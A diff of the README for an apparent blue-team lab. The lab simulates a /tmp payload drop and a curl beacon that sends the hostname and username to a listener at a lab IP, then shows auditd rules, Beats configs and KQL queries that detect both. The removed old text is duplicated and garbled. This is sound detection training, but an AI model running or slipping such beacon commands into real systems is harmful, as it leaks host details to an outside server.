@@ -1,24 +1,20 @@
-# SIEM_Lab_c2
-Blue Team IoC Hunt Lab
-Here’s a clean, copy-pasteable **README.md** you can drop straight into your repo.
+# SIEM\_Lab\_c2 — Blue Team IoC Hunt Lab
+
+A small lab that simulates basic malware behavior and shows how to detect it using **Filebeat (auditd)** and **Packetbeat** in the **Elastic/Kibana** stack.
 
 ---
 
-# Blue-Team IoC Hunt Lab: `/tmp` payload + `/beacon` C2
-
-A small lab that simulates basic malware behavior and shows how to detect it with **Filebeat (auditd)** and **Packetbeat** in **Elastic/Kibana**.
-
 ## What this lab demonstrates
 
-**Malware behaviors (simulated):**
+**Simulated malware behaviors:**
 
 1. Drops a file (payload) into `/tmp`
-2. “Calls home” via `curl` to an attacker server at `/beacon?user=...`
+2. "Calls home" via `curl` to an attacker server at `/beacon?user=...`
 
-**Blue-team detections:**
+**Detection goals (Blue Team):**
 
-* Watch `/tmp` for file writes/attribute changes via **auditd** (ingested by Filebeat’s `auditd` module)
-* Catch outbound HTTP requests to `/beacon` via **Packetbeat**
+* Monitor `/tmp` for suspicious file drops using **auditd** (via Filebeat)
+* Capture outbound HTTP traffic using **Packetbeat**
 
 ---
 
@@ -31,16 +27,16 @@ A small lab that simulates basic malware behavior and shows how to detect it wit
   └─ Simulated malware script (bash)
 
 [Attacker VM or Host]
-  └─ Simple Python listener (captures /beacon requests)
+  └─ Python listener to capture /beacon requests
 ```
 
-> Single-host works too if you bind the listener on localhost and point the script to it.
+> This can also be done on a single VM if the listener binds to `localhost`.
 
 ---
 
 ## Why `/tmp`?
 
-`/tmp` is world-writable, routinely used for transient data, and frequently abused by malware to stage payloads. Monitoring `/tmp` gives high signal for suspicious file creation, especially with odd names or unexpected executables.
+The `/tmp` folder is world-writable and often abused by malware to temporarily store payloads. It’s a high-signal location to monitor for unusual file activity with minimal noise.
 
 ---
 
@@ -62,165 +58,91 @@ A small lab that simulates basic malware behavior and shows how to detect it wit
 ## Requirements
 
 * Linux VM (Ubuntu/Debian tested)
-* sudo privileges
-* Elastic stack reachable (Kibana) or local output (you can also ship to Elasticsearch directly)
-* `auditd` installed and running
+* sudo access
+* Elastic Stack (Elasticsearch, Kibana) running locally or remotely
+* `auditd` installed and running on the victim machine
 
 ---
 
 ## Setup
 
-### 1) Attacker listener (Python)
+### 1. Attacker listener (Python)
 
-On your attacker host:
+On the attacker host:
 
-```bash
-Here’s a clean, copy-pasteable **README.md** you can drop straight into your repo.
-
----
-
-# Blue-Team IoC Hunt Lab: `/tmp` payload + `/beacon` C2
-
-A small lab that simulates basic malware behavior and shows how to detect it with **Filebeat (auditd)** and **Packetbeat** in **Elastic/Kibana**.
-
-## What this lab demonstrates
-
-**Malware behaviors (simulated):**
-
-1. Drops a file (payload) into `/tmp`
-2. “Calls home” via `curl` to an attacker server at `/beacon?user=...`
-
-**Blue-team detections:**
-
-* Watch `/tmp` for file writes/attribute changes via **auditd** (ingested by Filebeat’s `auditd` module)
-* Catch outbound HTTP requests to `/beacon` via **Packetbeat**
-
----
-
-## Topology
-
-```
-[Victim VM]
-  ├─ Filebeat (auditd module enabled)
-  ├─ Packetbeat
-  └─ Simulated malware script (bash)
-
-[Attacker VM or Host]
-  └─ Simple Python listener (captures /beacon requests)
-```
-
-> Single-host works too if you bind the listener on localhost and point the script to it.
-
----
-
-## Why `/tmp`?
-
-`/tmp` is world-writable, routinely used for transient data, and frequently abused by malware to stage payloads. Monitoring `/tmp` gives high signal for suspicious file creation, especially with odd names or unexpected executables.
-
----
-
-## Repo structure
-
-```
-.
-├─ scripts/
-│  ├─ victim_malware_sim.sh
-│  └─ attacker_listener.py
-├─ beats/
-│  ├─ filebeat-auditd-example.yml
-│  └─ packetbeat-http-example.yml
-└─ README.md
-```
-
----
-
-## Requirements
-
-* Linux VM (Ubuntu/Debian tested)
-* sudo privileges
-* Elastic stack reachable (Kibana) or local output (you can also ship to Elasticsearch directly)
-* `auditd` installed and running
-
----
-
-## Setup
-
-### 1) Attacker listener (Python)
-
-On your attacker host:
-
-```bash
+```python
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse, parse_qs
 
-class H(BaseHTTPRequestHandler):
-        def do_GET(self):
-                print(f"GET {self.path} UA={self.headers.get('User-Agent')} FROM={self.client_address}")
-                self.send_response(200);
-                self.end_headers();
-                self.wfile.write(b"OK")
-
-HTTPServer(("0.0.0.0",8000), H).serve_forever()
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        parsed = urlparse(self.path)
+        if parsed.path == '/beacon':
+            params = parse_qs(parsed.query)
+            client_ip = self.client_address[0]
+            ua = self.headers.get('User-Agent', '-')
+            print(f"[+] Beacon from {client_ip} | query={params} | UA={ua}")
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'OK')
 ```
 
-This prints any `/beacon?...` hits to stdout on **port 8000**.
+This listens on port `8000` and prints all `/beacon?...` traffic.
 
 ---
 
-### 2) Victim “malware” simulator (bash)
+### 2. Victim "malware" script (bash)
 
-On your victim host:
+On the victim host (`scripts/victim_malware_sim.sh`):
 
 ```bash
 #!/bin/bash
 
-#1) Drop an artifac in /tmp folder (mimics payload)
-echo "benign payload$(date)" > /tmp/p4yl04d.txt
-#Deliberately wrote the payload in a way distinguishable from the log
+# 1) Drop a payload file in /tmp
+echo "benign payload $(date)" > /tmp/p4yl04d.txt
 
-#2) Beacon to C2
+# 2) Call home (beacon) to the attacker server
 ATTACKER="192.168.56.101:8000"
-curl -v "http://$ATTACKER/beacon?host=$(hostname)&user=$(whoami)"
-#uses -v flag to view the background processes
+curl -s "http://$ATTACKER/beacon?host=$(hostname)&user=$(whoami)"
 
-echo "Done." #end script
+echo "Done."
 ```
 
 ---
 
-### 3) Install & enable auditd
+### 3. Install & enable auditd
 
 ```bash
-sudo apt-get update
-sudo apt-get install -y auditd audispd-plugins
+sudo apt update
+sudo apt install -y auditd audispd-plugins
 sudo systemctl enable --now auditd
 ```
 
-**Add an audit rule for `/tmp`:**
+Add an audit rule to watch `/tmp`:
 
-* **Temporary (runtime) rule:**
+**Temporary rule:**
 
-  ```bash
-  sudo auditctl -w /tmp -p wa -k payload_drop
-  ```
+```bash
+sudo auditctl -w /tmp -p wa -k payload_drop
+```
 
-* **Persistent rule (survives reboot):**
+**Persistent rule (survives reboot):**
 
-  ```bash
-  echo '-w /tmp -p wa -k payload_drop' | sudo tee /etc/audit/rules.d/payload_drop.rules
-  sudo augenrules --load
-  sudo systemctl restart auditd
-  ```
+```bash
+echo '-w /tmp -p wa -k payload_drop' | sudo tee /etc/audit/rules.d/payload_drop.rules
+sudo augenrules --load
+sudo systemctl restart auditd
+```
 
-> **What auditd does:** it’s the Linux Audit subsystem that logs security-relevant events (syscalls). The rule above says “watch `/tmp` for **w**rites and attribute changes (**a**), and tag those events with key `payload_drop`.”
+> `-p wa` = watch for **w**rites and **a**ttribute changes.
 
 ---
 
-### 4) Install Filebeat (with auditd module) & Packetbeat
+### 4. Install Filebeat & Packetbeat
 
-Follow Elastic’s install instructions for your distro, then:
+Follow Elastic documentation for your distro. Then:
 
 ```bash
-# Enable Filebeat auditd module
 sudo filebeat modules enable auditd
 
 sudo filebeat test config
@@ -230,6 +152,7 @@ sudo systemctl enable --now filebeat
 sudo systemctl enable --now packetbeat
 ```
 
+Example `beats/filebeat-auditd-example.yml`:
 
 ```yaml
 filebeat.modules:
@@ -244,7 +167,7 @@ setup.kibana:
   host: "<KIBANA_HOST>:5601"
 ```
 
-`beats/packetbeat-http-example.yml`
+Example `beats/packetbeat-http-example.yml`:
 
 ```yaml
 packetbeat.interfaces.device: any
@@ -260,17 +183,18 @@ setup.kibana:
   host: "<KIBANA_HOST>:5601"
 ```
 
-Restart services after edits:
+Restart both services after configuration:
 
 ```bash
-sudo systemctl restart filebeat packetbeat
+sudo systemctl restart filebeat
+sudo systemctl restart packetbeat
 ```
 
 ---
 
-## Kibana Hunting
+## Kibana: Hunting for IoCs
 
-### 1) Find the beacon request (Packetbeat)
+### 1. Beacon detection (Packetbeat)
 
 **KQL:**
 
@@ -278,89 +202,75 @@ sudo systemctl restart filebeat packetbeat
 http.request.method: "GET" AND url.full: */beacon*
 ```
 
-Good places to look:
-
-* **Discover** (index: `packetbeat-*`)
-* **HTTP dashboard** (from Packetbeat’s built-in dashboards, if setup)
-
-Tip: If `url.full` isn’t populated, try:
+If `url.full` is missing, try:
 
 ```kql
 url.path: "/beacon" OR http.request.body.content: *beacon*
 ```
 
-### 2) Find the `/tmp` drop (Filebeat / auditd)
+### 2. Payload drop detection (Filebeat auditd)
 
-Common ECS mappings for the auditd module include `event.module: auditd` and `file.path`. Try:
+**KQL:**
 
 ```kql
 event.module: "auditd" AND file.path: /tmp*
 ```
 
-You can also pivot on the audit key:
+Or search using the audit key:
 
 ```kql
-event.module: "auditd" AND event.action: "written" AND labels.auditd.key: "payload_drop"
+event.module: "auditd" AND labels.auditd.key: "payload_drop"
 ```
 
-(Depending on version/mappings, the key label may appear under `labels.auditd.key`, `auditd.log.key`, or `tags`—use Discover to see actual fields and tweak.)
-
-**Expected result:** You should see the weirdly named file in `/tmp` that the script created.
+> Note: Fields may vary slightly by Filebeat version. Use Discover to inspect the actual field names.
 
 ---
 
-## End-to-end test
+## End-to-End Test
 
-1. Start the **attacker listener** (`attacker_listener.py`) on port 8000
-2. Run the **victim script** with `ATTACKER_IP` pointing to the listener
-3. Check **Kibana → Discover**:
+1. Start the Python listener on attacker VM
+2. Run the victim script with `ATTACKER` IP pointing to listener
+3. In Kibana Discover:
 
-   * `packetbeat-*` with the `/beacon` KQL above
-   * `filebeat-*` with the `/tmp` KQL above
-4. Confirm:
-
-   * One or more HTTP GETs to `/beacon`
-   * File write events in `/tmp` with your odd payload filename
+   * Check `packetbeat-*` for `/beacon` GET
+   * Check `filebeat-*` for `/tmp/p4yl04d.txt` write event
+4. Confirm visibility on both network + endpoint
 
 ---
 
-## IoCs in this lab
+## IoCs simulated in this lab
 
-* **File drop location:** `/tmp` (unusual names, hidden dotfiles, newly created executables)
-* **Beacon pattern:** HTTP GET to `/beacon` with parameters like `?user=<user>&host=<host>&pid=<pid>`
+* File written in `/tmp` with unusual name (`p4yl04d.txt`)
+* Outbound beacon to `/beacon` endpoint via HTTP GET
 
 ---
 
-## Safety & ethics
+## Safety & Ethics
 
-This is an educational lab. Do **not** target networks or systems you don’t own or control. Keep it contained.
+This is an educational lab. Do **not** run this on production systems or networks you don’t own. Keep everything local or in an isolated VM environment.
 
 ---
 
 ## Credits
 
-Built to practice practical detection engineering: combining endpoint auditing with network telemetry to validate IoCs quickly.
-
-ChatGPT for ideas, framework and troubleshooting
+Created as part of hands-on SIEM learning.
+ChatGPT helped with planning, formatting, and troubleshooting the lab flow.
 
 ---
 
-### Appendix: Quick commands reference
+### Appendix: Quick Commands
 
 ```bash
-# audit rule (runtime)
+# Runtime audit rule
 sudo auditctl -w /tmp -p wa -k payload_drop
 
-# audit rule (persistent)
+# Persistent audit rule
 echo '-w /tmp -p wa -k payload_drop' | sudo tee /etc/audit/rules.d/payload_drop.rules
-sudo augenrules --load && sudo systemctl restart auditd
+sudo augenrules --load
+sudo systemctl restart auditd
 
-# KQL - network
+# KQL for Packetbeat
 http.request.method: "GET" AND url.full: */beacon*
 
-# KQL - file
+# KQL for Filebeat auditd
 event.module: "auditd" AND file.path: /tmp*
-```
-
----
-
